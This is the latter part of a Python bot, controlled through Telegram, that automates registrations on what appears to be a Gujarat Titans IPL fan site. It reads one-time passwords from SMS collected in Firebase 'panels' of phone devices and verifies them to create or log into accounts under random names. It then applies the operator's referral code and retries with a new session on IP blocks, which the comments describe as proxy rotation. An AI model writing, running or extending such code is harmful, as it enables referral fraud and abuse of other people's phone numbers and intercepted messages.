            tg_edit(chat_id, mid, "❌ Koi panel nahi hai.",
                    keyboard={"inline_keyboard":[[{"text":"« Back","callback_data":"panels_menu"}]]}); return
        tg_edit(chat_id, mid,
                f"⚠️ <b>Confirm: Sab Delete?</b>\n━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"Total <b>{len(panels)}</b> panels delete ho jaayenge:\n\n" +
                "\n".join(f"🔴 <code>{panel_label(u)}</code>" for u in panels) +
                "\n\n<i>Ye action undo nahi ho sakta!</i>",
                keyboard={"inline_keyboard":[
                    [{"text":"✅ Haan, Sab Delete Karo","callback_data":"delete_all_panels_do"}],
                    [{"text":"✖ Cancel","callback_data":"panels_menu"}]]})

    elif data == "delete_all_panels_do":
        save_panels([])
        tg_edit(chat_id, mid,
                "🗑 <b>Sab Panels Delete Ho Gaye!</b>\n━━━━━━━━━━━━━━━━━━━━━\n\n"
                "Ab nayi panels add karo.",
                keyboard={"inline_keyboard":[
                    [{"text":"➕ Add Panel","callback_data":"add_panel"},
                     {"text":"➕➕ Bulk Add","callback_data":"bulk_add_panels"}],
                    [{"text":"« Main Menu","callback_data":"main_menu"}]]})

    elif data == "remove_panel_list":
        panels = load_panels()
        if not panels:
            tg_edit(chat_id, mid, "❌ Koi panel nahi.",
                    keyboard={"inline_keyboard":[[{"text":"« Back","callback_data":"panels_menu"}]]}); return
        rows = [[{"text":f"🗑 {i+1}. {panel_label(u)}","callback_data":f"rmpanel_{i}"}]
                for i,u in enumerate(panels)]
        rows.append([{"text":"« Back","callback_data":"panels_menu"}])
        tg_edit(chat_id, mid, "🗑 <b>Kaunsa panel remove karna hai?</b>",
                keyboard={"inline_keyboard":rows})

    elif data.startswith("rmpanel_"):
        idx = int(data.split("_")[1])
        panels = load_panels()
        if 0 <= idx < len(panels):
            removed = panels.pop(idx); save_panels(panels)
            tg_edit(chat_id, mid,
                    f"✅ Removed: <code>{panel_label(removed)}</code>",
                    keyboard={"inline_keyboard":[
                        [{"text":"🗑 Aur Remove","callback_data":"remove_panel_list"},
                         {"text":"« Back","callback_data":"panels_menu"}]]})

    elif data == "panel_status":
        tg_edit(chat_id, mid, "⏳ Checking panels...")
        lines = ["📡 <b>Panel Status</b>","━━━━━━━━━━━━━━━━━━━━━",""]
        for i,url in enumerate(load_panels(),1):
            online, total = quick_panel_check(url)
            icon  = "🟢" if online > 0 else ("🟡" if total > 0 else "🔴")
            lines.append(f"{icon} Panel {i}: <code>{panel_label(url)}</code>\n   └ {online}/{total} online\n")
        tg_edit(chat_id, mid, "\n".join(lines),
                keyboard={"inline_keyboard":[
                    [{"text":"🔄 Refresh","callback_data":"panel_status"}],
                    [{"text":"« Back","callback_data":"panels_menu"}]]})

    elif data == "live_stats":
        tg_edit(chat_id, mid, _print_stats_text(),
                keyboard={"inline_keyboard":[
                    [{"text":"🔄 Refresh","callback_data":"live_stats"}],
                    [{"text":"« Main Menu","callback_data":"main_menu"}]]})

    elif data == "recent_logs":
        lines = ["📜 <b>Recent Results</b>","━━━━━━━━━━━━━━━━━━━━━",""]
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, encoding="utf-8") as f:
                last = f.readlines()[-20:]
            for l in last: lines.append(f"<code>{l.strip()[-90:]}</code>")
        else:
            lines.append("<i>Koi result nahi abhi tak</i>")
        tg_edit(chat_id, mid, "\n".join(lines),
                keyboard={"inline_keyboard":[
                    [{"text":"🔄 Refresh","callback_data":"recent_logs"}],
                    [{"text":"« Main Menu","callback_data":"main_menu"}]]})

    elif data == "set_ref":
        _WAITING_STATE[chat_id] = "awaiting_ref_code"
        tg_edit(chat_id, mid,
                f"🎯 <b>Set Referral Code</b>\n━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"Current: <code>{REFERRAL_CODE}</code>\n\n"
                f"Naya ref code bhejo (e.g. <code>GT-ABC123</code>):",
                keyboard={"inline_keyboard":[[{"text":"✖ Cancel","callback_data":"main_menu"}]]})

def handle_message(msg):
    global REFERRAL_CODE
    chat_id = msg["chat"]["id"]
    user_id = msg["from"]["id"]
    text    = (msg.get("text") or "").strip()
    if TG_USER and user_id != TG_USER: return

    if text in ("/start","/menu"):
        send_main_menu(chat_id); return

    state = _WAITING_STATE.get(chat_id)

    # ── Single Firebase URL ──────────────────────────────────
    if state == "awaiting_firebase":
        _WAITING_STATE.pop(chat_id, None)
        if not (text.startswith("http") and "firebase" in text.lower()):
            tg_send(chat_id, "❌ Invalid URL!",
                    keyboard={"inline_keyboard":[[{"text":"« Back","callback_data":"panels_menu"}]]}); return
        clean_url = clean_base_url(text)
        panels = load_panels()
        if clean_url in panels:
            tg_send(chat_id, f"⚠️ Panel already exist karta hai!\n<code>{panel_label(clean_url)}</code>",
                    keyboard={"inline_keyboard":[[{"text":"« Back","callback_data":"panels_menu"}]]}); return
        tg_send(chat_id, "⏳ Testing panel...")
        online, total = quick_panel_check(clean_url)
        panels.append(clean_url); save_panels(panels)
        icon = "🟢" if online > 0 else ("🟡" if total > 0 else "🔴")
        tg_send(chat_id,
                f"✅ <b>Panel Added!</b>\n"
                f"📡 <code>{panel_label(clean_url)}</code>\n"
                f"{icon} {online}/{total} devices online\n"
                f"Total panels: {len(panels)}",
                keyboard={"inline_keyboard":[
                    [{"text":"➕ Add More","callback_data":"add_panel"}],
                    [{"text":"➕➕ Bulk Add","callback_data":"bulk_add_panels"}],
                    [{"text":"« Panels","callback_data":"panels_menu"}]]}); return

    # ── Bulk Firebase URLs ───────────────────────────────────
    if state == "awaiting_bulk_firebase":
        _WAITING_STATE.pop(chat_id, None)
        urls = parse_firebase_urls_from_text(text)
        if not urls:
            tg_send(chat_id, "❌ Koi valid Firebase URL nahi mili!\nExample:\n"
                    "<code>https://abc-default-rtdb.firebaseio.com</code>",
                    keyboard={"inline_keyboard":[[{"text":"🔄 Try Again","callback_data":"bulk_add_panels"},
                                                   {"text":"« Back","callback_data":"panels_menu"}]]}); return
        panels  = load_panels()
        added   = []
        skipped = []
        for u in urls:
            if u in panels: skipped.append(u)
            else: panels.append(u); added.append(u)
        if added: save_panels(panels)

        lines = [f"📦 <b>Bulk Add Complete</b>","━━━━━━━━━━━━━━━━━━━━━",""]
        if added:
            lines.append(f"✅ Added ({len(added)}):")
            for u in added: lines.append(f"  • <code>{panel_label(u)}</code>")
        if skipped:
            lines.append(f"\n⏭ Already existed ({len(skipped)}):")
            for u in skipped: lines.append(f"  • <code>{panel_label(u)}</code>")
        lines.append(f"\n📡 Total panels now: <b>{len(panels)}</b>")
        tg_send(chat_id, "\n".join(lines),
                keyboard={"inline_keyboard":[
                    [{"text":"➕➕ Add More","callback_data":"bulk_add_panels"}],
                    [{"text":"« Panels","callback_data":"panels_menu"},
                     {"text":"« Main Menu","callback_data":"main_menu"}]]}); return

    # ── Referral Code ────────────────────────────────────────
    if state == "awaiting_ref_code":
        _WAITING_STATE.pop(chat_id, None)
        code = text.strip().upper()
        if re.match(r'^GT-[A-Z0-9]{4,8}$', code):
            REFERRAL_CODE = code
            tg_send(chat_id,
                    f"✅ <b>Ref Code Updated!</b>\n🎯 New code: <code>{REFERRAL_CODE}</code>",
                    keyboard={"inline_keyboard":[[{"text":"« Main Menu","callback_data":"main_menu"}]]}); return
        tg_send(chat_id, "❌ Invalid format. Use GT-XXXXXX (e.g. GT-K8TJZB)",
                keyboard={"inline_keyboard":[[{"text":"🔄 Try Again","callback_data":"set_ref"}]]}); return

    send_main_menu(chat_id)

def bot_poll_once():
    global _bot_offset
    if not TG_API: return
    try:
        r = std_req.get(f"{TG_API}/getUpdates",
                        params={"offset":_bot_offset,"timeout":5,
                                "allowed_updates":["message","callback_query"]},
                        timeout=12)
        if r.status_code != 200: return
        for upd in r.json().get("result",[]):
            _bot_offset = upd["update_id"] + 1
            try:
                if "callback_query" in upd: handle_callback(upd["callback_query"])
                elif "message" in upd:      handle_message(upd["message"])
            except Exception as e:
                print(f"[UPD-ERR] {e}", flush=True)
    except Exception as e:
        print(f"[POLL-ERR] {e}", flush=True)

def bot_polling_thread():
    info("🤖 Telegram polling started")
    while True:
        try: bot_poll_once()
        except Exception as e:
            print(f"[BOT-ERR] {e}", flush=True); time.sleep(3)

# ─────────────────────────────────────────────────────────────
# GT PROCESSING PIPELINE
# ─────────────────────────────────────────────────────────────
def process_gt_number(device_tuple):
    global REFERRAL_CODE
    number, dev_id, panel_url = device_tuple

    if number in _used:
        skip(f"{number}  Already processed"); _stat("skipped"); return

    first = random.choice(FIRST_NAMES)
    last  = random.choice(LAST_NAMES)

    print(f"\n{DIM}{'·'*52}{RST}", flush=True)
    info(f"{BOLD}{number}{RST}  →  {M}{first} {last}{RST}")
    _stats["current_phone"] = number

    session, ua = new_session()
    hdr = make_headers(ua)
    try: session.get(LOGIN_URL, headers=hdr, timeout=12)
    except: pass

    # SMS baseline before OTP
    baseline_keys, baseline_max_id = sms_baseline(panel_url, dev_id)
    sent_time = time.time()

    # Send OTP — retry with new proxy on IP block
    status, mp = 0, {}
    for attempt in range(1, MAX_RETRIES + 1):
        status, mp = api_send_otp(session, hdr, number)
        if status == 200: break
        if status == 403:
            err(f"{number}  IP Blocked — attempt {attempt}, rotating proxy")
            _stat("blocked")
            if attempt < MAX_RETRIES:
                time.sleep(2)
                session, ua = new_session()   # new session = new proxy from rotation
                hdr = make_headers(ua)
        elif status == 429:
            err(f"{number}  Rate Limited"); _stat("blocked"); return
        else:
            warn(f"{number}  HTTP {status} — retrying...")
        if attempt == MAX_RETRIES and status != 200:
            err(f"{number}  OTP send failed"); return

    mp_data = mp.get("data") or {}
    req_id  = mp_data.get("requestId","SI")

    if str(mp_data.get("status")) == "1":
        ok(f"{number}  OTP sent ✓")
    else:
        info(f"{number}  OTP resp: {mp_data}")

    # ── OTP — single 10s wait, one check, done ───────────────
    wait(f"{number}  OTP ke liye {OTP_WAIT}s wait...")
    time.sleep(OTP_WAIT)
    otp = get_new_gt_otp(panel_url, dev_id, baseline_keys, baseline_max_id, sent_time)
    if otp:
        ok(f"{number}  OTP: {BOLD}{otp}{RST}")
    else:
        err(f"{number}  OTP nahi aaya {OTP_WAIT}s mein — next number")
        _stat("otp_fail")
        _stats["current_phone"] = "-"
        return

    # Verify OTP
    status, cp = api_verify_otp(session, hdr, number, otp, req_id)
    if status != 200:
        err(f"{number}  OTP verify failed (HTTP {status})")
        _stats["current_phone"] = "-"
        return

    cp_data  = cp.get("data") or {}
    token    = (cp_data.get("token") or
                cp_data.get("user",{}).get("token","") or
                cp_data.get("access_token",""))
    uguid    = (cp_data.get("user_guid") or
                cp_data.get("user",{}).get("user_guid",""))
    uid      = cp_data.get("user_id","?")
    is_new   = cp_data.get("is_first_login") == "1"
    mem_code = cp_data.get("user",{}).get("membership_code","?")

    if is_new: new(f"{number}  🎉 NEW ACCOUNT  ID:{uid}  Code:{mem_code}")
    else:      ok(f"{number}  Login OK  ID:{uid}  Code:{mem_code}")

    # Get profile for fresh token
    _, gp     = api_get_profile(session, hdr, token=token, user_guid=uguid)
    gp_data   = gp.get("data") or {}
    fresh_tok = gp_data.get("token") or token
    if not uguid: uguid = gp_data.get("user_guid","")

    # Apply referral
    ref_applied = False
    if uguid:
        _, up   = api_update_profile(session, hdr, fresh_tok or token,
                                     uguid, number, first, last, REFERRAL_CODE)
        up_data    = up.get("data") or {}
        is_ref     = up_data.get("user",{}).get("is_referred")
        ref_applied = (is_ref == "1")
        msg_txt     = up_data.get("message","")
        if msg_txt: ok(f"{number}  Profile: {msg_txt}")
        if ref_applied:
            ok(f"{number}  Referral {BOLD}{REFERRAL_CODE}{RST} {G}APPLIED ✅{RST}")
        else:
            warn(f"{number}  Referral not applied (is_referred={is_ref})")

    mark_used(number)
    _stat("done")
    if is_new: _stat("new_acct")
    else:      _stat("existing")

    log_result(
        f"{'NEW' if is_new else 'EXI'}  {number}  {first} {last}  "
        f"ID:{uid}  Code:{mem_code}  Ref:{'YES' if ref_applied else 'NO'}  "
        f"Panel:{panel_label(panel_url)}"
    )

    tg_notify(
        f"{'🎉 NEW ACCOUNT!' if is_new else '✅ Registered'}\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"📱 Number  : <code>{number}</code>\n"
        f"👤 Name    : {first} {last}\n"
        f"🆔 User ID : {uid}\n"
        f"🏷 Code    : {mem_code}\n"
        f"🎯 Ref     : {'✅ Applied' if ref_applied else '❌ Not Applied'}\n"
        f"📡 Panel   : <code>{panel_label(panel_url)}</code>"
    )

    print(f"""
{BOLD}{G}  ┌{'─'*52}┐
  │  ✅  {number:<46}│
  ├{'─'*52}┤
  │  Name     : {(first+' '+last):<39}│
  │  User ID  : {str(uid):<39}│
  │  Mem Code : {str(mem_code):<39}│
  │  Status   : {('🎉 NEW ACCOUNT' if is_new else '✅ EXISTING'):<39}│
  │  Referral : {(REFERRAL_CODE if ref_applied else 'NOT APPLIED'):<39}│
  └{'─'*52}┘{RST}
""", flush=True)

    _stats["current_phone"] = "-"
    try: session.close()
    except: pass
    gc.collect()

# ─────────────────────────────────────────────────────────────
# PANEL LOOP
# ─────────────────────────────────────────────────────────────
def process_panel(panel_url):
    pname = panel_label(panel_url)
    print(f"\n{BOLD}{B}{'='*18} 📡 {pname} {'='*18}{RST}", flush=True)
    _stats["current_panel"] = pname

    numbers          = get_panel_numbers(panel_url)
    filtered, seen   = [], set()
    for ph, dev in numbers:
        if ph not in _used and ph not in seen:
            filtered.append((ph, dev, panel_url)); seen.add(ph)

    ok(f"{pname} → {len(filtered)} usable online numbers")
    if not filtered:
        warn(f"{pname}: koi online number nahi"); return

    for idx, device_tuple in enumerate(filtered, 1):
        if not load_bot_state().get("running", True):
            warn("⏹ Bot stopped via Telegram"); return
        ph = device_tuple[0]
        info(f"[{pname} {idx}/{len(filtered)}] → {ph}")
        try:
            process_gt_number(device_tuple)
        except Exception as e:
            err(f"Crash on {ph}: {e}")
        time.sleep(random.uniform(COOLDOWN_MIN, COOLDOWN_MAX))
        gc.collect()

    _stats["current_panel"] = "-"
    print(f"\n{BOLD}{B}{'='*18} 📡 {pname} DONE {'='*18}{RST}", flush=True)

# ─────────────────────────────────────────────────────────────
# BANNER
# ─────────────────────────────────────────────────────────────
def banner():
    print(f"""
{BOLD}{C}
╔══════════════════════════════════════════════════════════════╗
║     🏏  GT AUTO BOT v2 — UNIVERSAL FIREBASE EDITION  🏏     ║
║          Gujarat Titans IPL Fan Registration + Referral      ║
║          No Proxy Direct  •  10s OTP  •  Multi-Panel        ║
╚══════════════════════════════════════════════════════════════╝{RST}
""", flush=True)

# ─────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────
def main():
    banner()
    load_used()

    if not BOT_TOKEN: warn("⚠️  BOT_TOKEN not set")
    if not TG_USER:   warn("⚠️  TG_USER not set")

    info(f"🔌 Direct connection — proxy removed")
    info(f"⏱ OTP timing: {OTP_WAIT}s single wait — no retry")

    # Start Telegram polling thread
    if BOT_TOKEN and TG_USER:
        t = threading.Thread(target=bot_polling_thread, daemon=True)
        t.start()
        time.sleep(1)
        send_main_menu(TG_USER)
        ok("📲 Startup menu sent to Telegram")

    # Load panels
    panels = load_panels()
    if not panels:
        print(f"\n{BOLD}{C}  Panel add karo:{RST}")
        print(f"    {W}[1]{RST} Firebase URLs paste karo (line by line)")
        print(f"    {W}[2]{RST} Telegram se add karo (/start)")
        choice = input(f"\n  Choice (1/2): ").strip()
        if choice == "1":
            print("  Saari Firebase URLs paste karo (blank line se finish):")
            lines = []
            while True:
                l = input("  > ").strip()
                if not l: break
                lines.append(l)
            text = "\n".join(lines)
            urls = parse_firebase_urls_from_text(text)
            for u in urls:
                panels.append(u); ok(f"Added: {u[:60]}")
            if panels: save_panels(panels)

    if not panels:
        warn("Koi panel nahi — Telegram se /start bhejo phir bulk add karo")
        if BOT_TOKEN and TG_USER:
            ok("Waiting for panels via Telegram...")
            while True:
                time.sleep(5); bot_poll_once()
                panels = load_panels()
                if panels: ok(f"Got {len(panels)} panels!"); break
        else: return

    _stats["start"] = time.time()
    loop_count = 0

    while True:
        loop_count += 1
        _stats["loop"] = loop_count

        state = load_bot_state()
        if not state.get("running", True):
            warn(f"⏹ Bot paused (loop {loop_count}) — Telegram se start karo")
            time.sleep(5); continue

        panels = load_panels()
        if not panels:
            warn(f"⚠️ Loop {loop_count}: Koi panel nahi"); time.sleep(10); continue

        print(f"\n{BOLD}{'#'*14} 🔄 LOOP {loop_count} | {len(panels)} panels {'#'*14}{RST}", flush=True)

        for panel_url in panels:
            if not load_bot_state().get("running", True):
                warn("⏹ Bot stopped mid-loop"); break
            try: process_panel(panel_url)
            except Exception as e: err(f"Panel crash: {e}")
            time.sleep(2); gc.collect()

        print(f"\n{BOLD}{'#'*14} 🔄 LOOP {loop_count} COMPLETE {'#'*14}{RST}", flush=True)

        with _stats_lock: d = _stats.copy()
        total   = d["done"] + d["otp_fail"] + d["skipped"] + d["blocked"]
        elapsed = int(time.time() - d["start"])
        m, s    = divmod(elapsed, 60)
        print(f"""
{BOLD}{BG_D}{'═'*52}
  📊 LOOP {loop_count} STATS  ⏱ {m:02d}m {s:02d}s
{'═'*52}{RST}
  {G}✅ Done     : {d['done']:>4}  (New:{d['new_acct']}  Exist:{d['existing']}){RST}
  {R}❌ OTP Fail : {d['otp_fail']:>4}{RST}
  {Y}⏭  Skipped  : {d['skipped']:>4}{RST}
  {R}🚫 Blocked  : {d['blocked']:>4}{RST}
  {C}📱 Total    : {total:>4}{RST}
{BOLD}{BG_D}{'═'*52}{RST}
""", flush=True)

        ok("⏳ 8s rest phir next loop...")
        time.sleep(8)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Y}  ⚠ Stopped by user{RST}")
        with _stats_lock: d = _stats.copy()
        total   = d["done"] + d["otp_fail"] + d["skipped"] + d["blocked"]
        elapsed = int(time.time() - d["start"])
        m, s    = divmod(elapsed, 60)
        print(f"""
{BOLD}{G}
╔══════════════════════════════════════════════════════════════╗
║                    🏏  FINAL REPORT  🏏                      ║
╠══════════════════════════════════════════════════════════════╣
║  Total Registered : {str(d['done']):>5}  (New:{d['new_acct']}  Exist:{d['existing']})
║  OTP Failed       : {str(d['otp_fail']):>5}
║  Skipped          : {str(d['skipped']):>5}
║  Blocked          : {str(d['blocked']):>5}
║  Total Tried      : {str(total):>5}
║  Time Elapsed     : {m:02d}m {s:02d}s
║  Results saved    : gt_results.log
╚══════════════════════════════════════════════════════════════╝
{RST}""", flush=True)
# --- WEB SERVER FOR RENDER FREE PLAN ---
app = Flask(__name__)

@app.route('/')
def health():
    return "Bot is running!", 200

def run_server():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# Start the web server in the background
threading.Thread(target=run_server, daemon=True).start()
# ---------------------------------------
